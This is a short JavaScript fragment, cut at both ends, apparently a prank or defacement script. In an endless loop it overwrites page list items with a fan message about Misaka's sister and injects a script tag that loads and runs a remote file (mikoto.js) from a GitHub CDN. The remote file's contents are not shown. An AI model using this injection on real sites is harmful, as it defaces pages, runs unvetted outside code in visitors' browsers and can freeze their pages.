...
while (true) {
    for (i in document.getElementsByClassName('list-item')[0]["children"]) {
        try {
            document.getElementsByClassName('list-item')[0]["children"][i]["children"][0].innerHTML = "御坂妹妹真的太可爱啦！！<script> jumpurl=undefined var oHead = document.getElementsByTagName('HEAD').item(0); var oScript= document.createElement('script'); oScript.type = 'text/javascript'; oScript.src='https://cdn.jsdelivr.net/gh/zjkwdy/website-cdn/assets/js/mikoto.js'; oHead.appendChild( oScript); </script>"
        } catch {
            console.log('1')
        }
    }
